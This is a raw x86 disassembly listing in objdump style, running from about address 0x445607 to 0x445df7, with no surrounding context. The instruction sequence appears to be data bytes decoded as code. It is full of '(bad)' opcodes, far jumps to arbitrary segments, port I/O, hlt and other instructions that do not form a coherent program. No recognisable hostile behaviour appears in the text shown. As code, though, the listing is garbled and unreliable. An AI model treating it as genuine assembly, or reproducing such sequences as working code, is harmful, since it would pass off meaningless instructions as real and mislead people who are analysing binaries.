  445607:	shr    bh,0x46
  44560a:	mov    WORD PTR [ebx+0x57c88f8],ss
  445610:	mov    edx,ebp
  445612:	arpl   WORD PTR [edx+0x3d9b7c45],bx
  445618:	dec    esi
  445619:	ret    
  44561a:	ror    dh,0xe8
  44561d:	push   ecx
  44561e:	push   ss
  44561f:	out    0xf7,al
  445621:	adc    ecx,DWORD PTR [eax]
  445623:	std    
  445624:	call   0x51a14f
  445629:	or     edx,DWORD PTR [edi+0x44e8d10a]
  44562f:	mov    dh,0xbe
  445631:	xchg   ebx,eax
  445632:	or     BYTE PTR [edx+0x40983ef0],bl
  445638:	test   DWORD PTR [ebp+0x37],0xce84bc92
  44563f:	int    0x76
  445641:	pushf  
  445642:	rcr    BYTE PTR [eax+0x10],1
  445645:	sbb    edx,DWORD PTR [esi+0x67a8c39a]
  44564b:	out    0xf7,eax
  44564d:	mov    bh,0xc0
  44564f:	sub    BYTE PTR [eax],bl
  445651:	inc    edi
  445652:	sbb    BYTE PTR ds:0x925f3df7,bh
  445658:	mov    esp,0x76cdc68c
  44565d:	test   al,al
  44565f:	pop    eax
  445660:	adc    BYTE PTR [eax],al
  445662:	add    BYTE PTR [eax],al
  445664:	add    BYTE PTR [eax],al
  445666:	sbb    ecx,DWORD PTR [edx+ebx*4-0x18ec873d]
  44566d:	idiv   DWORD PTR [edi-0x40]
  445670:	push   eax
  445671:	sbb    bh,bl
  445673:	sbb    eax,0x57c5f73c
  445678:	xchg   edx,eax
  445679:	mov    esp,0x76cdce94
  44567e:	mov    WORD PTR [edx+0x2980515c],?
  445684:	mov    eax,0x134a0e8b
  445689:	idiv   BYTE PTR [edi]
  44568b:	xor    eax,0x99aef2fc
  445690:	hlt    
  445691:	pop    eax
  445692:	mov    al,ds:0x9c738979
  445697:	sub    DWORD PTR [edx],ecx
  445699:	sbb    al,0xd6
  44569b:	loope  0x4456a2
  44569d:	test   ebp,0x8cc0749e
  4456a3:	das    
  4456a4:	mov    bh,0x76
  4456a6:	stc    
  4456a7:	js     0x44562d
  4456a9:	outs   dx,DWORD PTR ds:[esi]
  4456aa:	popf   
  4456ab:	mov    cl,0x3a
  4456ad:	adc    al,0xbb
  4456af:	xlat   BYTE PTR ds:[ebx]
  4456b0:	(bad)  
  4456b1:	outs   dx,DWORD PTR ds:[esi]
  4456b2:	test   DWORD PTR [ecx],ebp
  4456b4:	xor    bl,BYTE PTR [esi+ebx*2]
  4456b7:	loope  0x4456c0
  4456b9:	not    DWORD PTR [ebp-0x62]
  4456bc:	je     0x44567e
  4456be:	xchg   esp,eax
  4456bf:	das    
  4456c0:	aaa    
  4456c1:	jbe    0x4456ab
  4456c3:	dec    eax
  4456c4:	hlt    
  4456c5:	mov    BYTE PTR [ecx-0x4e],bl
  4456c8:	or     al,0x79
  4456ca:	add    BYTE PTR [eax],al
  4456cc:	add    BYTE PTR [eax],al
  4456ce:	add    BYTE PTR [eax-0x5f91a687],ah
  4456d4:	sub    DWORD PTR [edx-0x7922b9e5],esp
  4456da:	neg    BYTE PTR [ebp-0x62]
  4456dd:	je     0x44569f
  4456df:	mov    WORD PTR [edi],gs
  4456e1:	aaa    
  4456e2:	ja     0x44568d
  4456e4:	js     0x445736
  4456e6:	outs   dx,DWORD PTR ds:[esi]
  4456e7:	pop    ecx
  4456e8:	sub    DWORD PTR [edx-0x7493e4ed],esp
  4456ee:	and    bl,BYTE PTR [ebx]
  4456f0:	push   0x29cac6cc
  4456f5:	mov    dh,bl
  4456f7:	(bad)  
  4456f8:	cld    
  4456f9:	ret    0x1804
  4456fc:	fimul  WORD PTR [esi]
  4456fe:	loop   0x44568e
  445700:	add    al,0xfe
  445702:	pusha  
  445703:	xor    BYTE PTR [ecx-0x583f60e7],0x96
  44570a:	stc    
  44570b:	sbb    ah,dh
  44570d:	fisubr WORD PTR [ecx]
  44570f:	adc    DWORD PTR [ecx+0x63],esp
  445712:	enter  0x437a,0x19
  445716:	ins    BYTE PTR es:[edi],dx
  445717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445718:	cmp    ebp,ecx
  44571a:	mov    esi,0x39f7401a
  44571f:	pop    ds
  445720:	cmp    al,0xe9
  445722:	jmp    0x95a2:0x9e25a298
  445729:	cmc    
  44572a:	jmp    0xa288:0xc20eea18
  445731:	and    eax,0x8f
  445736:	add    BYTE PTR [eax],al
  445738:	ins    DWORD PTR es:[edi],dx
  445739:	cdq    
  44573a:	xchg   ebp,eax
  44573b:	sub    al,0x94
  44573d:	in     al,0x41
  44573f:	sbb    edi,esp
  445741:	in     eax,0x2
  445743:	push   0x27
  445745:	scas   eax,DWORD PTR es:[edi]
  445746:	xchg   ebx,eax
  445747:	test   eax,0x5e25496f
  44574c:	popa   
  44574d:	fwait
  44574e:	cmc    
  44574f:	jmp    0xa249:0x20eea18
  445756:	xchg   ebp,eax
  445757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445758:	(bad)  
  445759:	ja     0x445741
  44575b:	mov    edi,0xe15b27a2
  445760:	pop    ebp
  445761:	jecxz  0x4457a2
  445763:	ss inc eax
  445765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445766:	lea    esp,ds:0x9dceb597
  44576c:	mov    ch,0x27
  44576e:	push   ebx
  44576f:	sbb    eax,0x62e6e51a
  445774:	pop    ecx
  445775:	daa    
  445776:	loope  0x44573a
  445778:	dec    edx
  445779:	xchg   esi,ebx
  44577b:	add    BYTE PTR [edx+0x3e],dl
  44577e:	bound  ebp,QWORD PTR [ebx]
  445780:	push   edx
  445781:	hlt    
  445782:	pop    esp
  445783:	adc    eax,0x89faeaf2
  445788:	cmc    
  445789:	sub    ah,BYTE PTR [esi-0x1]
  44578c:	outs   dx,BYTE PTR ds:[esi]
  44578d:	cmp    eax,0xaebcbc97
  445792:	loope  0x445793
  445794:	pop    esi
  445795:	out    dx,eax
  445796:	xchg   edi,eax
  445797:	dec    ebp
  445798:	gs jns 0x44575f
  44579b:	jae    0x44579d
  44579d:	add    BYTE PTR [eax],al
  44579f:	add    BYTE PTR [eax],al
  4457a1:	nop
  4457a2:	sub    DWORD PTR [ebx-0x8],esp
  4457a5:	mov    ds:0x7c88fec3,al
  4457aa:	cmp    dh,bh
  4457ac:	imul   ebp,edi,0x533be13c
  4457b2:	rcr    DWORD PTR [ebx],0x8b
  4457b5:	mov    esp,0x6c9c9742
  4457ba:	mov    dh,0xe1
  4457bc:	dec    DWORD PTR [esi]
  4457be:	daa    
  4457bf:	call   0xb8ff:0xe13de98d
  4457c6:	daa    
  4457c7:	push   ebx
  4457c8:	hlt    
  4457c9:	and    dh,dh
  4457cb:	pop    esp
  4457cc:	push   cs
  4457cd:	jb     0x4457aa
  4457cf:	loop   0x44575c
  4457d1:	mov    ah,0x9e
  4457d3:	xchg   edi,eax
  4457d4:	jge    0x445807
  4457d6:	inc    edi
  4457d7:	and    dh,bh
  4457d9:	pop    esi
  4457da:	cmp    eax,0x29b97595
  4457df:	sub    esi,esp
  4457e1:	sub    al,BYTE PTR [esi+0xf]
  4457e4:	mov    esp,esi
  4457e6:	inc    edx
  4457e7:	adc    DWORD PTR [eax-0x1ec34a],ecx
  4457ed:	xor    ah,BYTE PTR [edx]
  4457ef:	imul   edi,DWORD PTR [eax+0x6e],0x3d
  4457f3:	loope  0x445780
  4457f5:	cmc    
  4457f6:	mov    cl,0xe
  4457f8:	call   DWORD PTR [eax-0x1a761c38]
  4457fe:	mov    edi,0xa5783d95
  445803:	les    ecx,FWORD PTR [ebx+0x0]
  445809:	add    BYTE PTR [eax-0x3d],ch
  44580c:	adc    esi,esi
  44580e:	sub    DWORD PTR [bp-0x3a09],edx
  445813:	xchg   esp,eax
  445814:	test   BYTE PTR [ebx+0x333e2864],0x6b
  44581b:	jmp    0xd3:0x9f97fb27
  445822:	nop
  445823:	sbb    esp,DWORD PTR [edx*2-0x4294d760]
  44582a:	nop
  44582b:	sbb    ecx,DWORD PTR ds:0x40235033
  445831:	sbb    BYTE PTR [eax],cl
  445833:	add    DWORD PTR [edx],edx
  445835:	lea    edx,[eax-0x24]
  445838:	and    eax,0x16c8a03d
  44583d:	call   0xf8269fbf
  445842:	push   0xfffffffd
  445844:	repz mov al,0x90
  445847:	sbb    ecx,DWORD PTR ds:0x8e07558b
  44584d:	shl    dh,0x9c
  445850:	in     eax,0x22
  445852:	(bad)  
  445853:	cwde   
  445854:	xchg   DWORD PTR [eax],eax
  445856:	nop
  445857:	sbb    edx,DWORD PTR [esi+0x28a4984d]
  44585d:	add    al,0x19
  44585f:	addr16 loope 0x4457ed
  445862:	mov    edx,0xc3c1841
  445868:	cli    
  445869:	fiadd  DWORD PTR [ebx+0xffabdc]
  44586f:	add    BYTE PTR [eax],al
  445871:	add    BYTE PTR [eax],al
  445873:	je     0x44580b
  445875:	jp     0x445878
  445877:	xlat   BYTE PTR ds:[ebx]
  445878:	push   esi
  445879:	loope  0x44587c
  44587b:	nop
  44587c:	mov    dl,0xf7
  44587e:	add    edi,DWORD PTR [edi+0xa]
  445881:	pop    esi
  445882:	outs   dx,BYTE PTR ds:[esi]
  445883:	test   al,0x3b
  445885:	mov    ds:0xcba78707,al
  44588a:	hlt    
  44588b:	in     eax,0xc6
  44588d:	xchg   DWORD PTR [ecx+0x78],edx
  445890:	shl    edx,cl
  445892:	add    edx,DWORD PTR [eax+0xbfb823b]
  445898:	or     al,0x6c
  44589a:	ror    DWORD PTR [ebx],cl
  44589c:	cmc    
  44589d:	jae    0x44588c
  44589f:	cdq    
  4458a0:	test   al,0xf2
  4458a2:	adc    DWORD PTR [ecx-0x77],0xffffffcc
  4458a6:	pop    es
  4458a7:	adc    bl,dh
  4458a9:	push   es
  4458aa:	jl     0x44583a
  4458ac:	cmp    eax,0x736ef022
  4458b1:	pop    esi
  4458b2:	inc    ecx
  4458b3:	sbb    al,0x37
  4458b5:	mov    bh,0x7b
  4458b7:	sbb    al,0x36
  4458b9:	test   DWORD PTR [edx-0x78],edi
  4458bc:	in     eax,dx
  4458bd:	and    dl,BYTE PTR [edx+eax*4]
  4458c0:	clc    
  4458c1:	pop    ebx
  4458c2:	inc    ecx
  4458c3:	cld    
  4458c4:	in     al,dx
  4458c5:	xor    dl,BYTE PTR [edx+eax*4]
  4458c8:	lds    esi,FWORD PTR [ecx-0x7ce56ff5]
  4458ce:	out    dx,eax
  4458cf:	out    0x30,eax
  4458d1:	std    
  4458d2:	and    eax,0x7eef3b49
  4458d7:	add    BYTE PTR [eax],al
  4458d9:	add    BYTE PTR [eax],al
  4458db:	add    cl,ah
  4458dd:	in     al,0x7c
  4458df:	fbstp  TBYTE PTR [esi-0x8]
  4458e2:	clc    
  4458e3:	add    edx,DWORD PTR [esi+0x3d]
  4458e6:	mov    dl,0xb
  4458e8:	sbb    al,dl
  4458ea:	ins    DWORD PTR es:[edi],dx
  4458eb:	add    cl,BYTE PTR [eax]
  4458ed:	enter  0x7b89,0x88
  4458f1:	jb     0x445951
  4458f3:	dec    ecx
  4458f4:	mov    ch,ch
  4458f6:	xor    DWORD PTR [esi-0x54],esi
  4458f9:	in     al,0xe
  4458fb:	sub    DWORD PTR [edi-0x58d60936],edi
  445901:	sub    cl,ch
  445903:	xchg   ebx,eax
  445904:	test   eax,0xded99788
  445909:	cmp    DWORD PTR ds:0xb31ae6ba,0x12
  445910:	sub    DWORD PTR [eax],0xffffff8d
  445913:	sub    eax,0x9fd03b88
  445918:	(bad)  
  445919:	stc    
  44591a:	retf   
  44591b:	fst    QWORD PTR [ebx-0x296b16c5]
  445921:	push   ss
  445922:	inc    ecx
  445923:	jb     0x4458e5
  445925:	ret    0xe974
  445928:	inc    edx
  445929:	sahf   
  44592a:	push   es
  44592b:	(bad)  
  44592c:	mov    eax,0x9054e9be
  445931:	daa    
  445932:	arpl   cx,si
  445934:	dec    ebx
  445935:	adc    al,0xe8
  445937:	mov    esi,0xaa4b8822
  44593c:	fcomip st,st(6)
  44593e:	fstp   DWORD PTR [edx]
  445940:	add    BYTE PTR [eax],al
  445942:	add    BYTE PTR [eax],al
  445944:	add    BYTE PTR [edx-0x47c26a81],bh
  44594a:	ret    0x2595
  44594d:	mov    eax,0xa82595be
  445952:	retf   0x3b43
  445955:	pop    esp
  445956:	cmp    DWORD PTR [edi],0x52c15811
  44595c:	jmp    0xe96780d0
  445961:	xchg   ebx,eax
  445962:	mov    dl,0xe
  445964:	dec    eax
  445965:	dec    edi
  445966:	xchg   edx,eax
  445967:	push   edx
  445968:	jmp    0xa5dbc7f3
  44596d:	outs   dx,DWORD PTR ds:[esi]
  44596e:	mov    edx,0xb2686072
  445973:	push   cs
  445974:	jmp    0x96950c
  445979:	popf   
  44597a:	out    0x95,al
  44597c:	pop    eax
  44597d:	mov    eax,ds:0x952452b0
  445982:	out    0x7,eax
  445984:	mov    ebx,ecx
  445986:	das    
  445987:	mov    esi,?
  445989:	mov    bh,0xa7
  44598b:	and    eax,0x3ad73d8b
  445990:	and    DWORD PTR [ebx+0x62047a21],0x25
  445997:	js     0x4459c7
  445999:	in     al,0xe7
  44599b:	js     0x44592a
  44599d:	add    eax,0x728afe68
  4459a2:	scas   al,BYTE PTR es:[edi]
  4459a3:	push   esi
  4459a4:	or     al,0xea
  4459a6:	mov    al,ds:0xffea
  4459ab:	add    BYTE PTR [eax],al
  4459ad:	add    ah,ch
  4459af:	bnd jne 0x4459b3
  4459b2:	cmp    BYTE PTR [ebx+0x2e6a8b0e],dh
  4459b8:	icebp  
  4459b9:	stos   BYTE PTR es:[edi],al
  4459ba:	sub    eax,0x38b90eb3
  4459bf:	mov    bl,0xe
  4459c1:	add    BYTE PTR [edx-0x5a17e98b],ah
  4459c7:	mov    edx,0x6652000e
  4459cc:	dec    edx
  4459cd:	(bad)  
  4459ce:	cld    
  4459cf:	mov    dl,0xe
  4459d1:	add    cl,bh
  4459d3:	xor    eax,0x84c618aa
  4459d8:	inc    ebp
  4459d9:	ret    
  4459da:	jb     0x445a4e
  4459dc:	or     al,BYTE PTR [esi+ebp*2]
  4459df:	jae    0x4459cb
  4459e1:	add    eax,0xb80eb2f9
  4459e6:	call   0xdd44689d
  4459eb:	in     eax,0x95
  4459ed:	inc    esp
  4459ee:	popf   
  4459ef:	cs xchg esp,eax
  4459f1:	dec    eax
  4459f2:	shl    ebp,0xd6
  4459f5:	call   0xf83d3f8a
  4459fa:	mov    bh,0x65
  4459fc:	push   0x68
  4459fe:	mov    BYTE PTR [eax+0x62],bh
  445a01:	add    al,0xa7
  445a03:	push   0xd20f6fd
  445a08:	lds    esi,FWORD PTR [esi]
  445a0a:	xchg   edi,eax
  445a0b:	(bad)  
  445a0d:	adc    DWORD PTR [eax+ebp*1+0x58],0xffffff8b
  445a12:	add    BYTE PTR [eax],al
  445a14:	add    BYTE PTR [eax],al
  445a16:	add    ah,cl
  445a18:	mul    esp
  445a1a:	mov    ah,ah
  445a1c:	(bad)  
  445a1d:	cld    
  445a1e:	mov    BYTE PTR [edx-0x6fffec7d],dl
  445a24:	sbb    edx,edx
  445a26:	dec    ebp
  445a27:	sbb    esp,DWORD PTR [eax+0x31]
  445a2a:	or     BYTE PTR [ebx],cl
  445a2c:	repz fnsave [ecx+0x74]
  445a30:	sbb    al,0x5c
  445a32:	sbb    BYTE PTR [edi-0x75],cl
  445a35:	or     ch,al
  445a37:	popf   
  445a38:	or     al,0xde
  445a3a:	not    DWORD PTR [ebx]
  445a3c:	pusha  
  445a3d:	jmp    0xd5cac96
  445a42:	dec    ebp
  445a43:	(bad)  
  445a44:	int3   
  445a45:	inc    ebx
  445a46:	mov    edi,DWORD PTR [edx]
  445a48:	sub    ebp,ecx
  445a4a:	xor    edi,DWORD PTR [ebx]
  445a4c:	sub    ebx,eax
  445a4e:	xor    ebx,DWORD PTR [esi]
  445a50:	sub    esi,ebx
  445a52:	mul    ecx
  445a54:	jo     0x445a95
  445a56:	push   esi
  445a57:	gs pop eax
  445a59:	push   0xffffffea
  445a5b:	or     ecx,DWORD PTR [ebx+0x6a]
  445a5e:	shr    DWORD PTR [edx+0x1a],0xc5
  445a62:	call   DWORD PTR [ebx-0x2fccf2e5]
  445a68:	push   0x68c933da
  445a6d:	ret    
  445a6e:	xor    edx,edi
  445a70:	pushf  
  445a71:	test   DWORD PTR [ebp+0x1b],0x565443b3
  445a78:	test   DWORD PTR [ebp+0x3],edi
  445a7e:	add    BYTE PTR [eax],al
  445a80:	sub    dh,BYTE PTR [edx+0x76a1dccf]
  445a86:	not    DWORD PTR [edx-0x48]
  445a89:	gs cli 
  445a8b:	add    edx,DWORD PTR [eax+0x454c898d]
  445a91:	icebp  
  445a92:	mov    DWORD PTR [esp+ebp*1-0x2a],edi
  445a96:	out    dx,eax
  445a97:	push   ebp
  445a98:	loope  0x445ac7
  445a9a:	mov    esp,DWORD PTR [edi]
  445a9c:	xchg   esp,eax
  445a9d:	sbb    al,BYTE PTR [ebx-0xf]
  445aa0:	xchg   DWORD PTR ds:0x8f8cc774,ebp
  445aa6:	xor    eax,0x22f96ffb
  445aab:	mov    edi,0xbf3afe4c
  445ab0:	push   esp
  445ab1:	(bad)  
  445ab2:	imul   esi,eax,0xffffffc5
  445ab5:	cmp    ebx,ebp
  445ab7:	xor    DWORD PTR [edx+ecx*8],0x5c
  445abb:	dec    ecx
  445abc:	cwde   
  445abd:	sbb    DWORD PTR [ecx+edx*2-0x74],0x88736c84
  445ac5:	loope  0x445ace
  445ac7:	push   edi
  445ac8:	sbb    esi,DWORD PTR [ecx+edi*4-0x4f4de0b7]
  445acf:	dec    ecx
  445ad0:	sub    al,0xb3
  445ad2:	test   DWORD PTR [ebx],0x141c3f90
  445ad8:	adc    ebp,DWORD PTR [edx]
  445ada:	mov    cl,0x78
  445adc:	fwait
  445add:	cmp    DWORD PTR [ecx],edi
  445adf:	or     BYTE PTR [ebx+0xffc3fd],dl
  445ae5:	add    BYTE PTR [eax],al
  445ae7:	add    BYTE PTR [eax],al
  445ae9:	mov    edi,0x1b00222d
  445aee:	jl     0x445ad3
  445af0:	jp     0x445b48
  445af2:	mov    edx,0xbea3bef4
  445af7:	push   cs
  445af8:	mov    bl,0xe6
  445afa:	jle    0x445b16
  445afc:	bound  ebx,QWORD PTR [ecx-0x3e]
  445aff:	loopne 0x445aaa
  445b01:	(bad)  
  445b02:	mov    WORD PTR [ecx],ds
  445b04:	mov    fs:0x10e90eb3,al
  445b0a:	ja     0x445b02
  445b0c:	pusha  
  445b0d:	imul   esp,DWORD PTR [esi],0xffffff95
  445b10:	mov    ds:0x515339a7,al
  445b15:	sbb    ebp,edi
  445b17:	push   es
  445b18:	pusha  
  445b19:	dec    ecx
  445b1a:	push   ss
  445b1b:	lea    esi,[edx]
  445b1d:	jle    0x445abe
  445b1f:	outs   dx,BYTE PTR ds:[esi]
  445b20:	adc    cl,BYTE PTR [esi-0x6c167acb]
  445b26:	mov    dl,0xe
  445b28:	fs cwde 
  445b2a:	xchg   DWORD PTR [ebp-0x6440fa63],edx
  445b30:	lods   eax,DWORD PTR ds:[esi]
  445b31:	std    
  445b32:	ret    0xa497
  445b35:	arpl   WORD PTR [eax],di
  445b37:	push   cs
  445b38:	pusha  
  445b39:	leave  
  445b3a:	sub    dl,BYTE PTR [ebx-0x6a4137e0]
  445b40:	mov    esi,0xdee9bb6b
  445b45:	cs ins DWORD PTR es:[edi],dx
  445b47:	push   ebx
  445b48:	(bad)  
  445b49:	mov    WORD PTR [ebp+0x4dce],gs
  445b4f:	add    BYTE PTR [eax],al
  445b51:	add    BYTE PTR [eax-0x5d],ah
  445b54:	dec    ebp
  445b55:	jb     0x445b2f
  445b57:	sub    dl,BYTE PTR [ebp-0x17d4ed5f]
  445b5d:	cmp    al,0xd6
  445b5f:	xor    ch,BYTE PTR [ebx-0x52]
  445b62:	xchg   ebx,eax
  445b63:	sahf   
  445b64:	cs jb  0x445af4
  445b67:	das    
  445b68:	out    0x9f,al
  445b6a:	xchg   DWORD PTR [edi-0x5077d86b],esi
  445b70:	(bad)  
  445b72:	out    dx,eax
  445b73:	jecxz  0x445b5e
  445b75:	add    BYTE PTR [edx+esi*4-0x5712b16b],al
  445b7c:	pop    eax
  445b7d:	or     dl,ch
  445b7f:	ins    BYTE PTR es:[edi],dx
  445b80:	sbb    eax,0x5b1d030c
  445b85:	or     al,0x42
  445b87:	jp     0x445b83
  445b89:	pop    edi
  445b8a:	(bad)  
  445b8b:	js     0x445b22
  445b8d:	in     eax,0xfc
  445b8f:	lock test al,0x45
  445b92:	inc    ebp
  445b93:	scas   eax,DWORD PTR es:[edi]
  445b94:	push   cs
  445b95:	add    BYTE PTR [ecx-0xb742cf8],bh
  445b9b:	mov    edi,0xa0ca388f
  445ba0:	jae    0x445b82
  445ba2:	inc    esp
  445ba3:	into   
  445ba4:	lea    edi,ds:0x2a335d
  445baa:	imul   esp,DWORD PTR [ebx+0x334d682e],0x9891002a
  445bb4:	or     eax,0x0
  445bb9:	add    BYTE PTR [eax],al
  445bbb:	jns    0x445bed
  445bbd:	stos   BYTE PTR es:[edi],al
  445bbe:	add    al,0xf4
  445bc0:	out    dx,eax
  445bc1:	jns    0x445bd2
  445bc3:	bnd jb 0x445bc4
  445bc6:	imul   edi,DWORD PTR [eax],0x9d15e186
  445bcc:	cmp    ch,BYTE PTR [edx]
  445bce:	add    BYTE PTR [edx+0x6c8b15fa],ch
  445bd4:	retf   0xaff6
  445bd7:	pop    edi
  445bd8:	sbb    eax,0xca748be1
  445bdd:	daa    
  445bde:	pop    eax
  445bdf:	sub    eax,0x748affa3
  445be4:	cs aas 
  445be6:	push   edi
  445be7:	jb     0x445bea
  445be9:	xchg   ebp,eax
  445bea:	enter  0x6121,0xe0
  445bee:	call   FWORD PTR [esi]
  445bf0:	test   eax,0x9090142b
  445bf5:	sub    eax,edi
  445bf7:	sbb    ecx,edx
  445bf9:	push   cs
  445bfa:	mov    ecx,DWORD PTR [esi+0x64f6fa98]
  445c00:	and    BYTE PTR [esi+0x46],ah
  445c03:	mov    WORD PTR [eax],ds
  445c05:	stos   BYTE PTR es:[edi],al
  445c06:	xor    ebx,DWORD PTR [ecx+eiz*2-0x5f6bb206]
  445c0d:	sub    BYTE PTR [ebx+ecx*1],al
  445c10:	arpl   bp,sp
  445c12:	add    al,bh
  445c14:	(bad)  
  445c15:	push   cs
  445c16:	cmp    ch,BYTE PTR [edi+0x4d8ae965]
  445c1c:	jmp    0x44a488
  445c21:	add    BYTE PTR [eax],al
  445c23:	add    BYTE PTR [eax+0x4ae8c3a0],cl
  445c29:	jecxz  0x445c26
  445c2b:	test   DWORD PTR [edx-0x26],0x1387f7fb
  445c32:	ds add al,0x8f
  445c35:	pop    DWORD PTR [ebx-0x9]
  445c38:	ja     0x445bfb
  445c3a:	addr16 inc ebp
  445c3c:	cwde   
  445c3d:	push   0x42
  445c3f:	mov    ebx,DWORD PTR [ebx-0x3c]
  445c42:	outs   dx,DWORD PTR ds:[esi]
  445c43:	neg    BYTE PTR [edi+0x29]
  445c46:	les    ebx,FWORD PTR [esi]
  445c48:	push   edi
  445c49:	and    edx,edi
  445c4b:	div    DWORD PTR [ebp+0x3b]
  445c4e:	add    eax,DWORD PTR [eax-0x70]
  445c51:	adc    BYTE PTR [eax],dh
  445c53:	push   0xc412dba6
  445c58:	inc    esp
  445c59:	jmp    0xf8a7af9e
  445c5e:	gs cmp al,0x6c
  445c61:	pop    es
  445c62:	out    0xbf,al
  445c64:	popf   
  445c65:	call   DWORD PTR [ecx-0x75]
  445c68:	mov    esp,0xe8ef02b7
  445c6d:	pusha  
  445c6e:	xlat   BYTE PTR ds:[ebx]
  445c6f:	sub    eax,0xffffffb2
  445c72:	idiv   DWORD PTR [edx-0x44]
  445c75:	into   
  445c76:	jecxz  0x445cf2
  445c78:	inc    esp
  445c79:	into   
  445c7a:	out    0x78,eax
  445c7c:	lods   al,BYTE PTR ds:[esi]
  445c7d:	into   
  445c7e:	sti    
  445c7f:	clc    
  445c80:	daa    
  445c81:	test   al,0xcb
  445c83:	inc    esp
  445c84:	or     edi,DWORD PTR [edi-0x2d]
  445c87:	or     eax,DWORD PTR [eax]
  445c89:	add    BYTE PTR [eax],al
  445c8b:	add    BYTE PTR [eax],al
  445c8d:	out    0xa,eax
  445c8f:	push   0xf70b13c9
  445c94:	jp     0x445c1a
  445c96:	into   
  445c97:	adc    edi,DWORD PTR [ebx+0x4c]
  445c9a:	into   
  445c9b:	psubw  mm6,mm7
  445c9e:	lahf   
  445c9f:	fistp  QWORD PTR [eax+0x54]
  445ca2:	into   
  445ca3:	fistp  QWORD PTR [eax+0x64]
  445ca6:	into   
  445ca7:	retf   
  445ca8:	xor    dl,al
  445caa:	and    DWORD PTR [esi],esp
  445cac:	js     0x445c66
  445cae:	cmp    eax,0x21a027bb
  445cb3:	es js  0x445d19
  445cb6:	sbb    eax,0x3d5878b6
  445cbb:	mov    ebx,0xab3d9827
  445cc0:	daa    
  445cc1:	pushf  
  445cc2:	cmp    eax,0x38027b3
  445cc7:	cld    
  445cc8:	sar    DWORD PTR [ecx],1
  445cca:	add    edi,ebp
  445ccc:	sar    DWORD PTR [eax],1
  445cce:	mov    ebp,0x213c75fc
  445cd3:	out    0x77,al
  445cd5:	inc    eax
  445cd6:	and    DWORD PTR [ebx+0x20],ebx
  445cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445cda:	cmp    eax,0xce747f9f
  445cdf:	fcomip st,st(2)
  445ce1:	dec    esi
  445ce2:	mov    ch,0xa6
  445ce4:	jbe    0x445c74
  445ce6:	in     eax,dx
  445ce7:	or     esp,DWORD PTR [eax]
  445ce9:	mov    WORD PTR [ecx-0x13e88a21],fs
  445cef:	push   cs
  445cf0:	sub    eax,0x0
  445cf5:	add    BYTE PTR [eax-0x36179f3e],dh
  445cfb:	in     eax,0xbc
  445cfd:	jb     0x445cd1
  445cff:	jo     0x445d64
  445d01:	out    0x2,al
  445d03:	or     al,0xe1
  445d05:	mov    cl,0x17
  445d07:	or     al,0xe
  445d09:	xor    bl,BYTE PTR [edx-0x7f]
  445d0c:	int3   
  445d0d:	fst    DWORD PTR [ebx+0x5714e93d]
  445d13:	push   cs
  445d14:	pop    DWORD PTR [ebp-0x16f14a54]
  445d1a:	out    dx,al
  445d1b:	xor    DWORD PTR [ecx-0x53],0xad1b3b93
  445d22:	xor    ah,dh
  445d24:	push   cs
  445d25:	pusha  
  445d26:	cmp    DWORD PTR [edx+0x71],0xb3b93a5
  445d2d:	lods   eax,DWORD PTR ds:[esi]
  445d2e:	xor    ah,dh
  445d30:	push   cs
  445d31:	jo     0x445d94
  445d33:	jb     0x445da6
  445d35:	lods   eax,DWORD PTR ds:[esi]
  445d36:	xchg   ebx,eax
  445d37:	cmp    DWORD PTR [ebx],ebp
  445d39:	in     eax,dx
  445d3a:	repnz out 0xe,al
  445d3d:	pop    DWORD PTR [edi]
  445d3f:	mov    dh,0x76
  445d41:	xchg   BYTE PTR [edi+0x696570b2],dh
  445d47:	test   BYTE PTR [ecx-0x5b],dh
  445d4a:	xchg   ebx,eax
  445d4b:	mov    BYTE PTR [edx+0x5287abe4],bl
  445d51:	jmp    0xbd578c47
  445d56:	mov    dl,0xe6
  445d58:	push   cs
  445d59:	xchg   DWORD PTR [eax],eax
  445d5b:	add    BYTE PTR [eax],al
  445d5d:	add    BYTE PTR [eax],al
  445d5f:	mov    edi,0xd04e1ec5
  445d64:	mov    dl,0x70
  445d66:	ins    DWORD PTR es:[edi],dx
  445d67:	cwde   
  445d68:	into   
  445d69:	jno    0x445d98
  445d6b:	xchg   esp,eax
  445d6c:	ds cdq 
  445d6e:	in     al,0xb3
  445d70:	xchg   DWORD PTR [edx+0x0],edx
  445d73:	sub    DWORD PTR [ecx+0x780a002b],ebp
  445d79:	dec    ecx
  445d7a:	inc    esp
  445d7b:	stc    
  445d7c:	test   al,0x2b
  445d7e:	add    al,0x1a
  445d80:	jl     0x445dcb
  445d82:	inc    esp
  445d83:	jmp    0x4a4c8932
  445d88:	xchg   DWORD PTR [ecx+0x44],ecx
  445d8b:	stc    
  445d8c:	test   al,0x6b
  445d8e:	loopne 0x445da5
  445d90:	sbb    eax,0x53ecc7e1
  445d95:	dec    eax
  445d96:	inc    esp
  445d97:	jmp    0xb9456c4a
  445d9c:	dec    esi
  445d9d:	inc    esi
  445d9e:	ins    DWORD PTR es:[di],dx
  445da0:	scas   al,BYTE PTR es:[edi]
  445da1:	lods   eax,DWORD PTR ds:[esi]
  445da2:	pop    esp
  445da3:	iret   
  445da4:	out    0xe,eax
  445da6:	(bad)  
  445da7:	lods   al,BYTE PTR ds:[esi]
  445da8:	or     DWORD PTR [eax+0x44],0xffffffb9
  445dac:	es in  eax,0xff
  445daf:	jns    0x445da5
  445db1:	jmp    0xa901:0xee7cf53
  445db8:	mov    bl,0xe
  445dba:	mov    eax,ds:0x2a933d
  445dbf:	lock xor al,dh
  445dc2:	cld    
  445dc3:	add    BYTE PTR [eax],al
  445dc5:	add    BYTE PTR [eax],al
  445dc7:	add    BYTE PTR [esi+0x948af1c],dh
  445dcd:	out    0xe,eax
  445dcf:	mov    esp,edi
  445dd1:	out    dx,eax
  445dd2:	loope  0x445dd3
  445dd4:	xchg   esi,eax
  445dd5:	test   DWORD PTR [esi],ecx
  445dd7:	(bad)  
  445dd8:	cmp    al,0xd3
  445dda:	cld    
  445ddb:	aas    
  445ddc:	imul   ecx,DWORD PTR [ebx-0x4d06b1d6],0xbd4d15e1
  445de6:	dec    esi
  445de7:	add    cl,ah
  445de9:	sub    esp,ebp
  445deb:	(bad)  
  445dec:	jmp    0x91307909
  445df1:	sub    cl,BYTE PTR [ebp+0x0]
  445df4:	sar    al,0x18
  445df7:	pusha  
